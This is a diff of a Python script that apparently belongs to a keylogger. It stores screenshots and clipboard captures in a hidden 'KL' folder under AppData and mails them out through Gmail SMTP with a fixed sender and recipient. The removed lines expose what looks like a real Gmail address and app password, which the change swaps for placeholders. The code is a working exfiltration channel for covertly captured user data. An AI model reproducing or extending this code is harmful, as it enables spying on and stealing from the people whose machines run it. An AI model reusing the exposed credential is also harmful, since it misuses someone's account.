@@ -5,22 +5,24 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 import smtplib
-from concurrent.futures import ThreadPoolExecutor
+# from concurrent.futures import ThreadPoolExecutor
 import os
 import time
 from encrypt_and_decrypt import decrypt_files
 
-# Configure logging
+# logging
 logging.basicConfig(
     filename=os.path.join(os.environ['appdata'], "email_debug.log"),
     level=logging.DEBUG,
     format="%(asctime)s - %(levelname)s - %(message)s"
 )
 
-# Configurations
-email_address = "test123.moali@gmail.com"
-password = "bevnfpjwkmodnuln"
-toaddr = "test123.moali@gmail.com"
+# Email Configurations
+email_address = "sender-email@gmail.com"  # Replace with your email
+email_password = " app password or email password"  # Replace with your app password
+toaddr= "recipient-email@gmail.com"  # Replace with recipient email
+
+
 screenshot_folder = os.path.join(os.environ['appdata'], "KL")
 clipboard_pdf_file = os.path.join(screenshot_folder, "clipboard.pdf")
 
@@ -52,7 +54,7 @@ def send_email(subject, body, file_paths):
         # Send email
         with smtplib.SMTP('smtp.gmail.com', 587) as server:
             server.starttls()
-            server.login(email_address, password)
+            server.login(email_address,email_password)
             server.sendmail(email_address, toaddr, msg.as_string())
             logging.info("Email sent successfully.")
 
